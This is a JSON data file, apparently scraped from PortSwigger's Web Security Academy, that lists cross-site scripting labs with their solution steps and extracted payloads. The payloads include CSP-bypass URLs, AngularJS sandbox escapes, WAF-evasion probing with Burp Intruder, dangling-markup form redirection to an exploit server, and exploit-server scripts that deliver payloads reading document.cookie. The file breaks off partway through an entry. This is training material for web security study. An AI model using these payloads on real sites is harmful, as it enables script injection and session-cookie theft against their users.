[
  {
    "url": "https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-csp-bypass",
    "category": "cross-site-scripting",
    "title": "Reflected XSS protected by CSP, with CSP bypass",
    "description": "This lab uses CSP and contains a reflected XSS vulnerability.",
    "solution_steps": [
      "Enter the following into the search box: <img src=1 onerror=alert(1)>",
      "Observe that the payload is reflected, but the CSP prevents the script from executing.",
      "In Burp Proxy, observe that the response contains a Content-Security-Policy header, and the report-uri directive contains a parameter called token . Because you can control the token parameter, you can inject your own CSP directives into the policy.",
      "Visit the following URL, replacing YOUR-LAB-ID with your lab ID: https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27"
    ],
    "solution": "1. Enter the following into the search box: <img src=1 onerror=alert(1)>\n2. Observe that the payload is reflected, but the CSP prevents the script from executing.\n3. In Burp Proxy, observe that the response contains a Content-Security-Policy header, and the report-uri directive contains a parameter called token . Because you can control the token parameter, you can inject your own CSP directives into the policy.\n4. Visit the following URL, replacing YOUR-LAB-ID with your lab ID: https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27",
    "payloads": [
      "alert",
      "<img src=1 onerror=alert(1)>",
      "Content-Security-Policy",
      "report-uri",
      "token",
      "YOUR-LAB-ID",
      "https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27",
      "script-src-elem",
      "script",
      "script-src",
      "unsafe-inline"
    ]
  },
  {
    "url": "https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack",
    "category": "cross-site-scripting",
    "title": "Reflected XSS protected by very strict CSP, with dangling markup attack",
    "description": "This lab uses a strict CSP that prevents the browser from loading subresources from external domains.",
    "solution": "You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.",
    "payloads": [
      "hacker@evil-user.net",
      "<a href=\"\">Click me</a>",
      "wiener:peter",
      "<img src onerror=alert(1)>",
      "email input",
      "email",
      "text",
      "foo@example.com\"><img src= onerror=alert(1)>",
      "https://YOUR-LAB-ID.web-security-academy.net/my-account?email=<img src onerror=alert(1)>",
      "form-action",
      "/exploit",
      "https://exploit-YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit",
      "https://YOUR-LAB-ID.web-security-academy.net/my-account?email=foo@bar\"><button\n\t\t\t\t\t\t\tformaction=\"https://exploit-YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit\">Click\n\t\t\t\t\t\t\tme</button>",
      "formaction",
      "POST"
    ]
  },
  {
    "url": "https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-and-csp",
    "category": "cross-site-scripting",
    "title": "Reflected XSS with AngularJS sandbox escape and CSP",
    "description": "To solve the lab, perform a cross-site scripting attack that bypasses CSP, escapes the AngularJS sandbox, and alertsdocument.cookie.",
    "solution_steps": [
      "Go to the exploit server and paste the following code, replacing YOUR-LAB-ID with your lab ID: <script>\nlocation='https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';\n</script>",
      "Click \"Store\" and \"Deliver exploit to victim\"."
    ],
    "solution": "1. Go to the exploit server and paste the following code, replacing YOUR-LAB-ID with your lab ID: <script>\nlocation='https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';\n</script>\n2. Click \"Store\" and \"Deliver exploit to victim\".",
    "payloads": [
      "document.cookie",
      "YOUR-LAB-ID",
      "<script>\nlocation='https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';\n</script>",
      "ng-focus",
      "$event",
      "path",
      "window",
      "orderBy",
      "alert",
      "$event.path"
    ]
  },
  {
    "url": "https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-without-strings",
    "category": "cross-site-scripting",
    "title": "Reflected XSS with AngularJS sandbox escape without strings",
    "description": "This lab uses AngularJS in an unusual way where the$evalfunction is not available and you will be unable to use any strings in AngularJS.",
    "solution": "Visit the following URL, replacing\nYOUR-LAB-ID\nwith your lab ID:\nhttps://YOUR-LAB-ID.web-security-academy.net/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1\nThe exploit uses\ntoString()\nto create a string without using quotes. It then gets the\nString\nprototype and overwrites the\ncharAt\nfunction for every string. This effectively breaks the AngularJS sandbox. Next, an array is passed to the\norderBy\nfilter. We then set the argument for the filter by again using\ntoString()\nto create a string and the\nString\nconstructor property. Finally, we use the\nfromCharCode\nmethod generate our payload by converting character codes into the string\nx=alert(1)\n. Because the\ncharAt\nfunction has been overwritten, AngularJS will allow this code where normally it would not.",
    "payloads": [
      "$eval",
      "alert",
      "YOUR-LAB-ID",
      "https://YOUR-LAB-ID.web-security-academy.net/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1",
      "toString()",
      "String",
      "charAt",
      "orderBy",
      "fromCharCode",
      "x=alert(1)"
    ]
  },
  {
    "url": "https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded",
    "category": "cross-site-scripting",
    "title": "Reflected XSS into attribute with angle brackets HTML-encoded",
    "description": "This lab contains a reflected cross-site scripting vulnerability in the search blog functionality where angle brackets are HTML-encoded. To solve this lab, perform a cross-site scripting attack that injects an attribute and calls thealertfunction.",
    "solution": "Just because you're able to trigger the\nalert()\nyourself doesn't mean that this will work on the victim. You may need to try injecting your proof-of-concept payload with a variety of different attributes before you find one that successfully executes in the victim's browser.",
    "payloads": [
      "alert",
      "alert()",
      "\"onmouseover=\"alert(1)"
    ]
  },
  {
    "url": "https://portswigger.net/web-security/cross-site-scripting/contexts/lab-canonical-link-tag",
    "category": "cross-site-scripting",
    "title": "Reflected XSS in canonical link tag",
    "description": "This lab reflects user input in a canonical link tag and escapes angle brackets.",
    "solution_steps": [
      "Visit the following URL, replacing YOUR-LAB-ID with your lab ID: https://YOUR-LAB-ID.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1) This sets the X key as an access key for the whole page. When a user presses the access key, the alert function is called.",
      "To trigger the exploit on yourself, press one of the following key combinations: On Windows: ALT+SHIFT+X On MacOS: CTRL+ALT+X On Linux: Alt+X"
    ],
    "solution": "1. Visit the following URL, replacing YOUR-LAB-ID with your lab ID: https://YOUR-LAB-ID.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1) This sets the X key as an access key for the whole page. When a user presses the access key, the alert function is called.\n2. To trigger the exploit on yourself, press one of the following key combinations: On Windows: ALT+SHIFT+X On MacOS: CTRL+ALT+X On Linux: Alt+X",
    "payloads": [
      "alert",
      "ALT+SHIFT+X",
      "CTRL+ALT+X",
      "Alt+X",
      "YOUR-LAB-ID",
      "https://YOUR-LAB-ID.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)"
    ]
  },
  {
    "url": "https://portswigger.net/web-security/cross-site-scripting/contexts/lab-event-handlers-and-href-attributes-blocked",
    "category": "cross-site-scripting",
    "title": "Reflected XSS with event handlers andhrefattributes blocked",
    "description": "This lab contains a reflected XSS vulnerability with some whitelisted tags, but all events and anchorhrefattributes are blocked.",
    "solution": "Visit the following URL, replacing\nYOUR-LAB-ID\nwith your lab ID:\nhttps://YOUR-LAB-ID.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E",
    "payloads": [
      "href",
      "alert",
      "<a href=\"\">Click me</a>",
      "YOUR-LAB-ID",
      "https://YOUR-LAB-ID.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E"
    ]
  },
  {
    "url": "https://portswigger.net/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded",
    "category": "cross-site-scripting",
    "title": "Stored XSS into anchorhrefattribute with double quotes HTML-encoded",
    "description": "This lab contains a stored cross-site scripting vulnerability in the comment functionality. To solve this lab, submit a comment that calls thealertfunction when the comment author name is clicked.",
    "solution_steps": [
      "Post a comment with a random alphanumeric string in the \"Website\" input, then use Burp Suite to intercept the request and send it to Burp Repeater.",
      "Make a second request in the browser to view the post and use Burp Suite to intercept the request and send it to Burp Repeater.",
      "Observe that the random string in the second Repeater tab has been reflected inside an anchor href attribute.",
      "Repeat the process again but this time replace your input with the following payload to inject a JavaScript URL that calls alert: javascript:alert(1)",
      "Verify the technique worked by right-clicking, selecting \"Copy URL\", and pasting the URL in the browser. Clicking the name above your comment should trigger an alert."
    ],
    "solution": "1. Post a comment with a random alphanumeric string in the \"Website\" input, then use Burp Suite to intercept the request and send it to Burp Repeater.\n2. Make a second request in the browser to view the post and use Burp Suite to intercept the request and send it to Burp Repeater.\n3. Observe that the random string in the second Repeater tab has been reflected inside an anchor href attribute.\n4. Repeat the process again but this time replace your input with the following payload to inject a JavaScript URL that calls alert: javascript:alert(1)\n5. Verify the technique worked by right-clicking, selecting \"Copy URL\", and pasting the URL in the browser. Clicking the name above your comment should trigger an alert.",
    "payloads": [
      "href",
      "alert",
      "javascript:alert(1)"
    ]
  },
  {
    "url": "https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked",
    "category": "cross-site-scripting",
    "title": "Reflected XSS into HTML context with all tags blocked except custom ones",
    "description": "To solve the lab, perform a cross-site scripting attack that injects a custom tag and automatically alertsdocument.cookie.",
    "solution_steps": [
      "Go to the exploit server and paste the following code, replacing YOUR-LAB-ID with your lab ID: <script>\nlocation = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';\n</script>",
      "Click \"Store\" and \"Deliver exploit to victim\"."
    ],
    "solution": "1. Go to the exploit server and paste the following code, replacing YOUR-LAB-ID with your lab ID: <script>\nlocation = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';\n</script>\n2. Click \"Store\" and \"Deliver exploit to victim\".",
    "payloads": [
      "document.cookie",
      "YOUR-LAB-ID",
      "<script>\nlocation = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';\n</script>",
      "onfocus",
      "alert"
    ]
  },
  {
    "url": "https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked",
    "category": "cross-site-scripting",
    "title": "Reflected XSS into HTML context with most tags and attributes blocked",
    "description": "This lab contains a reflected XSS vulnerability in the search functionality but uses a web application firewall (WAF) to protect against common XSS vectors.",
    "solution_steps": [
      "Inject a standard XSS vector, such as: <img src=1 onerror=print()>",
      "Observe that this gets blocked. In the next few steps, we'll use use Burp Intruder to test which tags and attributes are being blocked.",
      "Open Burp's browser and use the search function in the lab. Send the resulting request to Burp Intruder.",
      "In Burp Intruder, replace the value of the search term with: <>",
      "Place the cursor between the angle brackets and click Add \u00a7 to create a payload position. The value of the search term should now look like: <\u00a7\u00a7>",
      "Visit the XSS cheat sheet and click Copy\n                        tags to clipboard .",
      "In the Payloads side panel, under Payload configuration , click Paste to paste the list of tags into the payloads list. Click Start attack .",
      "When the attack is finished, review the results. Note that most payloads caused a 400 response, but the body payload caused a 200 response.",
      "Go back to Burp Intruder and replace your search term with: <body%20=1>",
      "Place the cursor before the = character and click Add \u00a7 to create a payload position. The value of the search term should now look like: <body%20\u00a7\u00a7=1>",
      "Visit the XSS cheat sheet and click Copy events to clipboard .",
      "In the Payloads side panel, under Payload configuration , click Clear to remove the previous payloads. Then click Paste to paste the list of attributes into the payloads list. Click Start attack .",
      "When the attack is finished, review the results. Note that most payloads caused a 400 response, but the onresize payload caused a 200 response.",
      "Go to the exploit server and paste the following code, replacing YOUR-LAB-ID with your lab ID: <iframe src=\"https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E\" onload=this.style.width='100px'>",
      "Click Store and Deliver exploit to victim ."
    ],
    "solution": "1. Inject a standard XSS vector, such as: <img src=1 onerror=print()>\n2. Observe that this gets blocked. In the next few steps, we'll use use Burp Intruder to test which tags and attributes are being blocked.\n3. Open Burp's browser and use the search function in the lab. Send the resulting request to Burp Intruder.\n4. In Burp Intruder, replace the value of the search term with: <>\n5. Place the cursor between the angle brackets and click Add \u00a7 to create a payload position. The value of the search term should now look like: <\u00a7\u00a7>\n6. Visit the XSS cheat sheet and click Copy\n                        tags to clipboard .\n7. In the Payloads side panel, under Payload configuration , click Paste to paste the list of tags into the payloads list. Click Start attack .\n8. When the attack is finished, review the results. Note that most payloads caused a 400 response, but the body payload caused a 200 response.\n9. Go back to Burp Intruder and replace your search term with: <body%20=1>\n10. Place the cursor before the = character and click Add \u00a7 to create a payload position. The value of the search term should now look like: <body%20\u00a7\u00a7=1>\n11. Visit the XSS cheat sheet and click Copy events to clipboard .\n12. In the Payloads side panel, under Payload configuration , click Clear to remove the previous payloads. Then click Paste to paste the list of attributes into the payloads list. Click Start attack .\n13. When the attack is finished, review the results. Note that most payloads caused a 400 response, but the onresize payload caused a 200 response.\n14. Go to the exploit server and paste the following code, replacing YOUR-LAB-ID with your lab ID: <iframe src=\"https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E\" onload=this.style.width='100px'>\n15. Click Store and Deliver exploit to victim .",
    "payloads": [
      "print()",
      "<img src=1 onerror=print()>",
      "<\u00a7\u00a7>",
      "body",
      "<body%20=1>",
      "<body%20\u00a7\u00a7=1>",
      "onresize",
      "YOUR-LAB-ID",
      "<iframe src=\"https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E\" onload=this.style.width='100px'>"
    ]
  },
  {
    "url": "https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped",
    "category": "cross-site-scripting",
    "title": "Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped",
    "description": "This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets and double are HTML encoded and single quotes are escaped.",
    "solution_steps": [
      "Submit a random alphanumeric string in the search box, then use Burp Suite to intercept the search request and send it to Burp Repeater.",
      "Observe that the random string has been reflected inside a JavaScript string.",
      "Try sending the payload test'payload and observe that your single quote gets backslash-escaped, preventing you from breaking out of the string.",
      "Try sending the payload test\\payload and observe that your backslash doesn't get escaped.",
      "Replace your input with the following payload to break out of the JavaScript string and inject an alert: \\'-alert(1)//",
      "Verify the technique worked by right clicking, selecting \"Copy URL\", and pasting the URL in the browser. When you load the page it should trigger an alert."
    ],
    "solution": "1. Submit a random alphanumeric string in the search box, then use Burp Suite to intercept the search request and send it to Burp Repeater.\n2. Observe that the random string has been reflected inside a JavaScript string.\n3. Try sending the payload test'payload and observe that your single quote gets backslash-escaped, preventing you from breaking out of the string.\n4. Try sending the payload test\\payload and observe that your backslash doesn't get escaped.\n5. Replace your input with the following payload to break out of the JavaScript string and inject an alert: \\'-alert(1)//\n6. Verify the technique worked by right clicking, selecting \"Copy URL\", and pasting the URL in the browser. When you load the page it should trigger an alert.",
    "payloads": [
      "alert",
      "test'payload",
      "test\\payload",
      "\\'-alert(1)//"
    ]
  },
  {
    "url": "https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded",
    "category": "cross-site-scripting",
    "title": "Reflected XSS into a JavaScript string with angle brackets HTML encoded",
    "description": "This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets are encoded. The reflection occurs inside a JavaScript string. To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls thealertfunction.",
    "solution_steps": [
      "Submit a random alphanumeric string in the search box, then use Burp Suite to intercept the search request and send it to Burp Repeater.",
      "Observe that the random string has been reflected inside a JavaScript string.",
      "Replace your input with the following payload to break out of the JavaScript string and inject an alert: '-alert(1)-'",
      "Verify the technique worked by right clicking, selecting \"Copy URL\", and pasting the URL in the browser. When you load the page it should trigger an alert."
    ],
    "solution": "1. Submit a random alphanumeric string in the search box, then use Burp Suite to intercept the search request and send it to Burp Repeater.\n2. Observe that the random string has been reflected inside a JavaScript string.\n3. Replace your input with the following payload to break out of the JavaScript string and inject an alert: '-alert(1)-'\n4. Verify the technique worked by right clicking, selecting \"Copy URL\", and pasting the URL in the browser. When you load the page it should trigger an alert.",
    "payloads": [
      "alert",
      "'-alert(1)-'"
    ]
  },
  {
    "url": "https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped",
    "category": "cross-site-scripting",
    "title": "Reflected XSS into a JavaScript string with single quote and backslash escaped",
    "description": "This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality. The reflection occurs inside a JavaScript string with single quotes and backslashes escaped.",
    "solution_steps": [
      "Submit a random alphanumeric string in the search box, then use Burp Suite to intercept the search request and send it to Burp Repeater.",
      "Observe that the random string has been reflected inside a JavaScript string.",
      "Try sending the payload test'payload and observe that your single quote gets backslash-escaped, preventing you from breaking out of the string.",
      "Replace your input with the following payload to break out of the script block and inject a new script: </script><script>alert(1)</script>",
      "Verify the technique worked by right clicking, selecting \"Copy URL\", and pasting the URL in the browser. When you load the page it should trigger an alert."
    ],
    "solution": "1. Submit a random alphanumeric string in the search box, then use Burp Suite to intercept the search request and send it to Burp Repeater.\n2. Observe that the random string has been reflected inside a JavaScript string.\n3. Try sending the payload test'payload and observe that your single quote gets backslash-escaped, preventing you from breaking out of the string.\n4. Replace your input with the following payload to break out of the script block and inject a new script: </script><script>alert(1)</script>\n5. Verify the technique worked by right clicking, selecting \"Copy URL\", and pasting the URL in the browser. When you load the page it should trigger an alert.",
    "payloads": [
      "alert",
      "test'payload",
      "</script><script>alert(1)</script>"
    ]
  },
  {
    "url": "https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped",
    "category": "cross-site-scripting",
    "title": "Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped",
    "description": "This lab contains a reflected cross-site scripting vulnerability in the search blog functionality. The reflection occurs inside a template string with angle brackets, single, and double quotes HTML encoded, and backticks escaped. To solve this lab, perform a cross-site scripting attack that calls thealertfunction inside the template string.",
    "solution_steps": [
      "Submit a random alphanumeric string in the search box, then use Burp Suite to intercept the search request and send it to Burp Repeater.",
      "Observe that the random string has been reflected inside a JavaScript template string.",
      "Replace your input with the following payload to execute JavaScript inside the template string: ${alert(1)}",
      "Verify the technique worked by right clicking, selecting \"Copy URL\", and pasting the URL in the browser. When you load the page it should trigger an alert."
    ],
    "solution": "1. Submit a random alphanumeric string in the search box, then use Burp Suite to intercept the search request and send it to Burp Repeater.\n2. Observe that the random string has been reflected inside a JavaScript template string.\n3. Replace your input with the following payload to execute JavaScript inside the template string: ${alert(1)}\n4. Verify the technique worked by right clicking, selecting \"Copy URL\", and pasting the URL in the browser. When you load the page it should trigger an alert.",
    "payloads": [
      "alert",
      "${alert(1)}"
    ]
  },
  {
    "url": "https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-url-some-characters-blocked",
    "category": "cross-site-scripting",
    "title": "Reflected XSS in a JavaScript URL with some characters blocked",
    "description": "This lab reflects your input in a JavaScript URL, but all is not as it seems. This initially seems like a trivial challenge; however, the application is blocking some characters in an attempt to prevent XSS attacks.",
    "solution": "Visit the following URL, replacing\nYOUR-LAB-ID\nwith your lab ID:\nhttps://YOUR-LAB-ID.web-security-academy.net/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27\nThe lab will be solved, but the alert will only be called if you click \"Back to blog\" at the bottom of the page.\nThe exploit uses exception handling to call the\nalert\nfunction with arguments. The\nthrow\nstatement is used, separated with a blank comment in order to get round the no spaces restriction. The\nalert\nfunction is assigned to the\nonerror\nexception handler.\nAs\nthrow\nis a statement, it cannot be used as an expression. Instead, we need to use arrow functions to create a block so that the\nthrow\nstatement can be used. We then need to call this function, so we assign it to the\ntoString\nproperty of\nwindow\nand trigger this by forcing a string conversion on\nwindow\n.",
    "payloads": [
      "alert",
      "1337",
      "YOUR-LAB-ID",
      "https://YOUR-LAB-ID.web-security-academy.net/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27",
      "throw",
      "onerror",
      "toString",
      "window"
    ]
  },
  {
    "url": "https://portswigger.net/web-security/cross-site-scripting/contexts/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped",
    "category": "cross-site-scripting",
    "title": "Stored XSS intoonclickevent with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped",
    "description": "This lab contains a stored cross-site scripting vulnerability in the comment functionality.",
    "solution_steps": [
      "Post a comment with a random alphanumeric string in the \"Website\" input, then use Burp Suite to intercept the request and send it to Burp Repeater.",
      "Make a second request in the browser to view the post and use Burp Suite to intercept the request and send it to Burp Repeater.",
      "Observe that the random string in the second Repeater tab has been reflected inside an onclick event handler attribute.",
      "Repeat the process again but this time modify your input to inject a JavaScript URL that calls alert , using the following payload: http://foo?&apos;-alert(1)-&apos;",
      "Verify the technique worked by right-clicking, selecting \"Copy URL\", and pasting the URL in the browser. Clicking the name above your comment should trigger an alert."
    ],
    "solution": "1. Post a comment with a random alphanumeric string in the \"Website\" input, then use Burp Suite to intercept the request and send it to Burp Repeater.\n2. Make a second request in the browser to view the post and use Burp Suite to intercept the request and send it to Burp Repeater.\n3. Observe that the random string in the second Repeater tab has been reflected inside an onclick event handler attribute.\n4. Repeat the process again but this time modify your input to inject a JavaScript URL that calls alert , using the following payload: http://foo?&apos;-alert(1)-&apos;\n5. Verify the technique worked by right-clicking, selecting \"Copy URL\", and pasting the URL in the browser. Clicking the name above your comment should trigger an alert.",
    "payloads": [
      "onclick",
      "alert",
      "http://foo?&apos;-alert(1)-&apos;"
    ]
  },
  {
    "url": "https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed",
    "category": "cross-site-scripting",
    "title": "Reflected XSS with some SVG markup allowed",
    "description": "This lab has a simple reflected XSS vulnerability. The site is blocking common tags but misses some SVG tags and events.",
    "solution_steps": [
      "Inject a standard XSS payload, such as: <img src=1 onerror=alert(1)>",
      "Observe that this payload gets blocked. In the next few steps, we'll use Burp Intruder to test which tags and attributes are being blocked.",
      "Open Burp's browser and use the search function in the lab. Send the resulting request to Burp Intruder.",
      "In the request template, replace the value of the search term with: <>",
      "Place the cursor between the angle brackets and click Add \u00a7 to create a payload position. The value of the search term should now be: <\u00a7\u00a7>",
      "Visit the XSS cheat sheet and click Copy tags to clipboard .",
      "In Burp Intruder, in the Payloads side panel, click Paste to paste the list of tags into the payloads list. Click Start attack .",
      "When the attack is finished, review the results. Observe that all payloads caused a 400 response, except for the ones using the <svg> , <animatetransform> , <title> , and <image> tags, which received a 200 response.",
      "Go back to the Intruder tab and replace your search term with: <svg><animatetransform%20=1>",
      "Place the cursor before the = character and click Add \u00a7 to create a payload position. The value of the search term should now be: <svg><animatetransform%20\u00a7\u00a7=1>",
      "Visit the XSS cheat sheet and click Copy events to clipboard .",
      "In Burp Intruder, in the Payloads side panel, click Clear to remove the previous payloads. Then click Paste to paste the list of attributes into the payloads list. Click Start attack .",
      "When the attack is finished, review the results. Note that all payloads caused a 400 response, except for the onbegin payload, which caused a 200 response. Visit the following URL in the browser to confirm that the alert() function is called and the lab is solved: https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E"
    ],
    "solution": "1. Inject a standard XSS payload, such as: <img src=1 onerror=alert(1)>\n2. Observe that this payload gets blocked. In the next few steps, we'll use Burp Intruder to test which tags and attributes are being blocked.\n3. Open Burp's browser and use the search function in the lab. Send the resulting request to Burp Intruder.\n4. In the request template, replace the value of the search term with: <>\n5. Place the cursor between the angle brackets and click Add \u00a7 to create a payload position. The value of the search term should now be: <\u00a7\u00a7>\n6. Visit the XSS cheat sheet and click Copy tags to clipboard .\n7. In Burp Intruder, in the Payloads side panel, click Paste to paste the list of tags into the payloads list. Click Start attack .\n8. When the attack is finished, review the results. Observe that all payloads caused a 400 response, except for the ones using the <svg> , <animatetransform> , <title> , and <image> tags, which received a 200 response.\n9. Go back to the Intruder tab and replace your search term with: <svg><animatetransform%20=1>\n10. Place the cursor before the = character and click Add \u00a7 to create a payload position. The value of the search term should now be: <svg><animatetransform%20\u00a7\u00a7=1>\n11. Visit the XSS cheat sheet and click Copy events to clipboard .\n12. In Burp Intruder, in the Payloads side panel, click Clear to remove the previous payloads. Then click Paste to paste the list of attributes into the payloads list. Click Start attack .\n13. When the attack is finished, review the results. Note that all payloads caused a 400 response, except for the onbegin payload, which caused a 200 response. Visit the following URL in the browser to confirm that the alert() function is called and the lab is solved: https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E",
    "payloads": [
      "alert()",
      "<img src=1 onerror=alert(1)>",
      "<\u00a7\u00a7>",
      "<svg>",
      "<animatetransform>",
      "<title>",
      "<image>",
      "<svg><animatetransform%20=1>",
      "<svg><animatetransform%20\u00a7\u00a7=1>",
      "onbegin",
      "https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E"
    ]
  },
  {
    "url": "https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression",
    "category": "cross-site-scripting",
    "title": "DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded",
    "description": "This lab contains a DOM-based cross-site scripting vulnerability in a AngularJS expression within the search functionality.",
    "solution_steps": [
      "Enter a random alphanumeric string into the search box.",
      "View the page source and observe that your random string is enclosed in an ng-app directive.",
      "Enter the following AngularJS expression in the search box: {{$on.constructor('alert(1)')()}}",
      "Click search ."
    ],
    "solution": "1. Enter a random alphanumeric string into the search box.\n2. View the page source and observe that your random string is enclosed in an ng-app directive.\n3. Enter the following AngularJS expression in the search box: {{$on.constructor('alert(1)')()}}\n4. Click search .",
    "payloads": [
      "ng-app",
      "alert",
      "{{$on.constructor('alert(1)')()}}"
    ]
  },
  {
    "url": "https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink",
    "category": "cross-site-scripting",
    "title": "DOM XSS indocument.writesink using sourcelocation.search",
    "description": "This lab contains a DOM-based cross-site scripting vulnerability in the search query tracking functionality. It uses the JavaScriptdocument.writefunction, which writes data out to the page. Thedocument.writefunction is called with data fromlocation.search, which you can control using the website URL.",
    "solution_steps": [
      "Enter a random alphanumeric string into the search box.",
      "Right-click and inspect the element, and observe that your random string has been placed inside an img src attribute.",
      "Break out of the img attribute by searching for: \"><svg onload=alert(1)>"
    ],
    "solution": "1. Enter a random alphanumeric string into the search box.\n2. Right-click and inspect the element, and observe that your random string has been placed inside an img src attribute.\n3. Break out of the img attribute by searching for: \"><svg onload=alert(1)>",
    "payloads": [
      "document.write",
      "location.search",
      "alert",
      "img src",
      "\"><svg onload=alert(1)>"
    ]
  },
  {
    "url": "https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element",
    "category": "cross-site-scripting",
    "title": "DOM XSS indocument.writesink using sourcelocation.searchinside a select element",
    "description": "This lab contains a DOM-based cross-site scripting vulnerability in the stock checker functionality. It uses the JavaScriptdocument.writefunction, which writes data out to the page. Thedocument.writefunction is called with data fromlocation.searchwhich you can control using the website URL. The data is enclosed within a select element.",
    "solution_steps": [
      "On the product pages, notice that the dangerous JavaScript extracts a storeId parameter from the location.search source. It then uses document.write to create a new option in the select element for the stock checker functionality.",
      "Add a storeId query parameter to the URL and enter a random alphanumeric string as its value. Request this modified URL.",
      "In the browser, notice that your random string is now listed as one of the options in the drop-down list.",
      "Right-click and inspect the drop-down list to confirm that the value of your storeId parameter has been placed inside a select element.",
      "Change the URL to include a suitable XSS payload inside the storeId parameter as follows: product?productId=1&storeId=\"></select><img%20src=1%20onerror=alert(1)>"
    ],
    "solution": "1. On the product pages, notice that the dangerous JavaScript extracts a storeId parameter from the location.search source. It then uses document.write to create a new option in the select element for the stock checker functionality.\n2. Add a storeId query parameter to the URL and enter a random alphanumeric string as its value. Request this modified URL.\n3. In the browser, notice that your random string is now listed as one of the options in the drop-down list.\n4. Right-click and inspect the drop-down list to confirm that the value of your storeId parameter has been placed inside a select element.\n5. Change the URL to include a suitable XSS payload inside the storeId parameter as follows: product?productId=1&storeId=\"></select><img%20src=1%20onerror=alert(1)>",
    "payloads": [
      "document.write",
      "location.search",
      "alert",
      "storeId",
      "product?productId=1&storeId=\"></select><img%20src=1%20onerror=alert(1)>"
    ]
  },
  {
    "url": "https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected",
